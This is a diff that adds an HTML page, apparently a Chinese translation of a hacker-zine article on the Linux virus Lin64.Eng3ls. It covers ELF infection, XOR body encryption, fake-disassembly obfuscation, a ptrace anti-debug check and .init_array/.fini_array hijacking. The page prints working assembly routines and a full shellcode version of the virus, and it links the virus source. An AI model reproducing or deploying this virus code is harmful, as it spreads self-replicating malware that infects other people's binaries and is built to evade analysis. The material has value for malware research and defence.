@@ -1,0 +1,266 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("../gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+Lin64.Eng3ls：Linux病毒中的一些反逆向工程技术                   │                   █   │
+~ S01den & sblip                                            └───────────────────█ ──┘
+
+由S01den用爱创作。
+邮箱：S01den@protonmail.com
+
+--- 引言 ---
+
+我和Sblip在一个周末为一个私人活动开发了Lin64.Eng3ls。
+Eng3ls基本上是Lin64.Kropotkine[0]的改进版本，感染方法仍然是使用相同的
+PT_NOTE到PT_LOAD段转换，但我们添加了一些混淆技术。
+
+事实上，Kropotkin完全不具备隐蔽性：被感染二进制文件的入口点被直接修改为
+指向病毒，而且病毒代码是明文的（所以很容易分析...）。
+
+为了解决这些问题，我们为病毒主体制作了一个寡态xor解密器/加密器（我知道这
+不是很fancy...），密钥在每个新感染的二进制文件中都会改变，这样每个复制的
+代码都是不同的。
+
+然而，这种穷人版的多态性有一个很大的缺点，就是解密器的代码不会改变。
+
+因此，如果没有更多的巫术，逆向工程师会很快理解病毒是如何加密的，以及它做
+什么。
+
+这就是为什么我第一次在我的病毒中实现了多态假反汇编技术（或简称"假多态"），
+以混淆解密器。
+
+查看我写的关于这个技术的论文，看看它是如何工作的以及结果如何！
+（基本上就是翻到杂志的下一页）
+
+但仍然存在一个问题：被感染二进制文件的入口点直接指向病毒，这一点都不隐蔽！
+让我们看看我们是如何解决这个问题的...
+
+--- ELF的入口点混淆技术 ---
+
+/!\ 这个技术不适用于PIE二进制文件 /!\
+
+入口点混淆简单来说就是病毒隐藏其第一条指令地址的行为。
+
+在非EPO病毒中，被感染程序的入口点被修改为指向病毒的开始，而在EPO病毒中，
+病毒是通过其他方式被调用的，无论是通过在宿主代码中隐藏一个跳转，还是像这里
+一样，利用可执行文件格式的特性。
+
+在ELF中，入口点实际上不是程序运行时执行的第一个地址。
+
+有一些glibc初始化例程，最终会加载main()。
+
+我不会详细解释它是如何工作的，已经有一篇很酷的论文[1]讲述了这个。
+只需要记住我们将劫持.init_array和.fini_array段，它们分别包含指向二进制
+文件的构造函数和析构函数的指针。
+
+因此，位于.init_array中的代码地址在入口点之前执行。这正是我们想要的！
+
+我首先选择实现一个小型的反调试技术，一个ptrace检查来查看当前进程是否被跟踪
+（所以是被调试或straced）。
+经典的"if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(0);"...
+很容易绕过（修补病毒或在gdb中在比较时设置rax = 0）...
+所以我让它变得"困难"（其实也不是很难）检测！
+
+------------------------- 分割线 --------------------------------------------------
+check_dbg:
+    push rbp
+    mov rbp, rsp
+
+    jmp jmp_over4+2
+    jmp_over4:
+      db `\x41\xba` ; 假反汇编
+    mov rax, 101 ; sys_ptrace
+    xor rdi, rdi ; PTRACE_TRACEME
+    xor rsi, rsi
+    xor r10, r10
+    xor rdx, rdx
+    inc rdx
+    jmp jmp_over6+2
+    jmp_over6:
+      db `\xe9\x94` ; 假反汇编
+    syscall
+
+    jmp jmp_over5+2
+    jmp_over5:
+      db `\x49\x81` ; 假反汇编
+    cmp rax, 0
+    jge continue
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+    continue:
+    pop rbp
+    ret
+-------------------------------------------------------------------------------------
+
+我在例程中写入了一些假反汇编字节（在每次新感染时都会改变），并通过滥用
+.init_array使其在main()之前被调用。
+因此，如果被调试，病毒会停止执行，即使在入口点设置了断点。
+
+关于病毒本身，我让它在最后通过滥用.fini_array被调用。
+这里是我写的用于解析节头表以搜索.init_array和.fini_array，以及修补它们的
+例程。
+
+------------------------- 分割线 --------------------------------------------------
+parse_shdr:
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ; rcx = 程序头表中的条目数
+  mov rbx, qword [rax+e_hdr.shoff]   ; rbx = 程序头表的偏移量
+  mov dx, word [rax+e_hdr.shentsize] ; rdx = 程序头表条目的大小
+
+  loop_shdr:
+    add rbx, rdx
+    dec rcx
+    cmp dword [rax+rbx+e_shdr.type], 0x0E ; 0x0F = SHT_INIT_ARRAY，我们要修改的
+                                          ; 段，用于放置调试检查(.init_array)
+    je ctor_found
+    cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY，我们要修改的
+                                          ; 段，用于EPO(.fini_array)
+    je dtor_found
+    cmp rcx, 0
+    jg loop_shdr
+
+dtor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  mov [rax+rdi], r9 ; r9保存转换段的地址，我们在这里写入病毒
+  jmp write_vx
+
+ctor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  add r9, 0x86 ; r9+0x86 = check_dbg开始的地址
+  mov [rax+rdi], r9
+  sub r9, 0x86
+  jmp loop_shdr
+-------------------------------------------------------------------------------------
+
+--- 结论 ---
+
+入口点修改是很糟糕的，应该使用入口点混淆技巧，比如.init_array或.fini_array
+劫持。
+
+添加一些有趣的反RE技巧来为你的病毒增添趣味：这里加一点加密，那里加一勺调试器
+检测...
+
+我希望你喜欢这篇文章，并且学到了一些东西。
+
+如果你想更深入地了解，我写了一个使用与eng3ls相同的反逆向工程技术的crackme。
+
+在这里查看：https://crackmes.one/crackme/6049f27f33c5d42c3d016dea
+
+--- 附加内容 ---
+
+我写了一个无空字节版本的病毒。
+无空字节代码 + 位置无关 = shellcode \o/
+所以这里是病毒的shellcode版本：
+
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc9\x4d"
+    "\x31\xc0\x49\x89\xe6\x48\x81\xc4\xe8\xc3\x11\x11\x48\x81\xec\xde"
+    "\xc0\x11\x11\x49\x89\xe7\xeb\x7c\x58\x48\x2d\x87\xc1\x11\x11\x48"
+    "\x05\xde\xc0\x11\x11\x50\x41\x5c\x68\xe8\xc3\x11\x11\x5e\x48\x81"
+    "\xee\xde\xc0\x11\x11\x48\x81\xc6\xe8\xc3\x11\x11\x48\x81\xee\xde"
+    "\xc0\x11\x11\x48\x31\xff\x6a\x07\x5a\x6a\x22\x41\x5a\x6a\x09\x58"
+    "\x0f\x05\x48\x89\xc3\x56\x59\xb0\x54\x48\x31\xd2\x41\x8a\x14\x3c"
+    "\x48\x81\xc7\xde\xc0\x11\x11\x48\x81\xff\x86\xc1\x11\x11\x76\x02"
+    "\x30\xc2\x48\x81\xef\xde\xc0\x11\x11\x88\x14\x3b\x48\xff\xc7\xe2"
+    "\xdb\x49\x89\xdf\x48\x81\xc3\x87\xc1\x11\x11\x48\x81\xeb\xde\xc0"
+    "\x11\x11\xff\xe3\xe8\x7f\xff\xff\xff\x1c\xd5\x90\x5e\x57\x54\x54"
+    "\x1c\xd5\x90\x5e\x57\x54\x54\x1c\xd5\x90\x54\x55\x54\x54\xbd\x6b"
+    "\x56\x54\x54\x0b\xec\x56\x54\x54\x54\x1c\x65\xa2\x5b\x51\x1c\xdd"
+    "\x93\xec\x8d\x54\x54\x54\x1c\xdd\xb2\xee\x54\x50\x54\x54\x5b\x51"
+    "\x1c\xd7\xac\x54\x5b\xd8\xb1\x55\x54\x54\x1d\xdd\x91\x1c\x65\x8f"
+    "\x1c\xdd\xb4\x1c\xd7\x94\x47\x1c\xdd\x92\xeb\x55\x54\x54\x54\x1c"
+    "\x65\x9d\xde\x18\x70\x46\x07\xbc\x42\x54\x54\x54\x0f\x32\xdf\x10"
+    "\x70\x44\x1c\x55\x97\x1c\x55\x90\x18\x6d\xbf\x28\x87\xbd\xf9\x55"
+    "\x54\x54\x1c\xdd\xb1\x1c\xd7\xad\x5c\x21\x05\x1c\xdd\xa3\xec\x56"
+    "\x54\x54\x54\xea\x56\x50\x54\x54\x5b\x51\x1c\xd7\xac\x54\x2a\x68"
+    "\x1c\xdd\x97\x1c\xdd\xb2\x18\x7d\xba\xec\x50\x54\x54\x54\x5b\x51"
+    "\x1d\xdd\x8c\x1c\xdf\x22\x64\xeb\x54\x54\x54\x54\xee\x52\x54\x54"
+    "\x54\x19\x65\x9d\x15\xee\x55\x54\x54\x54\x1c\x65\x94\xec\x5d\x54"
+    "\x54\x54\x5b\x51\xd5\x6c\x2b\x11\x18\x12\x20\x45\xec\x57\x54\x54"
+    "\x54\x1c\xdd\x8b\x5b\x51\x1c\x65\x94\x1c\xdd\xb8\x97\xd4\x2c\x50"
+    "\x56\x20\x56\xbf\xb3\x32\xd7\x2c\x44\x56\x20\x56\xbf\x8a\xd5\x2c"
+    "\x5d\x8a\x94\xf9\x8a\x21\x53\x1c\x65\x94\x1c\xdd\xb8\x97\x1c\x65"
+    "\x9d\x1c\x65\x86\x32\xdf\x1c\x6c\x1c\xdf\x0c\x74\x32\xdf\x04\x62"
+    "\x1c\x55\x87\x1c\xab\x9d\xd7\x68\x4c\x50\x20\x52\x1c\xd7\xad\x54"
+    "\x2b\xba\x93\x14\x5d\x8a\x94\xf9\x8a\x93\x50\x4c\x55\x54\x54\x54"
+    "\x93\x10\x4c\x50\x53\x54\x54\x54\x15\xed\x54\x54\x54\x58\x1d\x55"
+    "\xa5\x18\xdd\x18\x4c\x44\x1c\xdf\x28\x4c\x74\x1c\xd5\x93\x5e\x57"
+    "\x54\x54\x1c\xdd\x28\x4c\x74\x1c\xdf\x28\x4c\x7c\x1c\xd5\x93\x5e"
+    "\x57\x54\x54\x1c\xdd\x28\x4c\x7c\x1c\xdd\x20\x4c\x5c\x1c\x65\x9d"
+    "\x1c\x65\x86\x32\xdf\x1c\x68\x1c\xdf\x0c\x7c\x32\xdf\x04\x6e\x1c"
+    "\x55\x87\x1c\xab\x9d\xd7\x28\x4c\x50\x5b\x20\x52\x1c\xd7\xad\x54"
+    "\x2b\xb9\x1c\xdf\x28\x4c\x4c\x18\xdd\x58\x6c\xee\x50\x54\x54\x54"
+    "\x1c\xdd\x93\xec\x4e\x54\x54\x54\x5b\x51\xec\x5f\x54\x54\x54\x5b"
+    "\x51\x5b\x65\x32\x61\xf9\x8a\x15\xde\x1b\x3c\x15\xdc\x13\x3c\x1c"
+    "\x65\x86\x1c\x65\x8f\x15\xde\x48\x43\x15\xdc\xc8\x43\x5e\x57\x54"
+    "\x54\x1c\xab\x96\x1c\xd5\xae\xfd\x54\x54\x54\x21\xbc\x15\xde\x48"
+    "\x43\x64\x97\x15\xdc\xc8\x43\x5e\x57\x54\x54\x1c\xab\x96\x1c\xd5"
+    "\xae\x5e\x57\x54\x54\x21\xb2\x18\xdd\x93\x18\xdd\xaa\x1c\xd5\x92"
+    "\x5e\x57\x54\x54\xee\x5e\x57\x54\x54\x1c\xd7\x96\x7a\xec\x55\x54"
+    "\x54\x54\x5b\x51\xec\x57\x54\x54\x54\x5b\x51\x1c\xdd\xb8\x97\xec"
+    "\x55\x54\x54\x54\x1c\x65\xab\x1c\xab\x93\x3c\x5e\x0c\x0b\x0c\x1c"
+    "\xdd\xb2\xee\x50\x54\x54\x54\x5b\x51\xec\x68\x54\x54\x54\x5b\x51"
+    "\x1c\x65\x9d\x1c\x65\x8f\x1c\x65\x94\x1c\x65\x86\x97\x1c\xdf\x50"
+    "\x70\x97\xbc\xe8\xa9\xab\xab\x7a\x54\x54";
+
+不要做傻事，不要将这些东西传播到野外。
+我们不对你使用这些代码的行为负责。
+
+--&gt; 编写无空字节代码的两种技术：
+
+1) 用push指令替换mov指令。
+示例：
+
+b809000000     mov eax, 9  ----&gt; 6a09 push 0x9
+                                 58   pop rax
+2) 加/减技术：
+有时候你添加到寄存器的值会包含空字节。
+你可以通过添加和减去一个垃圾值来去除它们。
+示例：
+
+4881c4890300  add rsp, 0x389  ----&gt; 4881c4e8c311  add rsp, 0x1111c3e8
+          ^                         // 0x1111c3e8 = 0x389 + 0x1111c0de
+                                    4881ecdec011  sub rsp, 0x1111c0de
+
+--- 注释和参考文献 ---
+[0] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[1] 滥用.CTORS和.DTORS获得乐趣和利益
+    https://www.exploit-db.com/papers/13234
+
+--- 源代码 ---
+
+- <a href="Linux.Eng3ls.asm">Linux.Eng3ls.asm</a>
+</pre></div></center></body></html> 
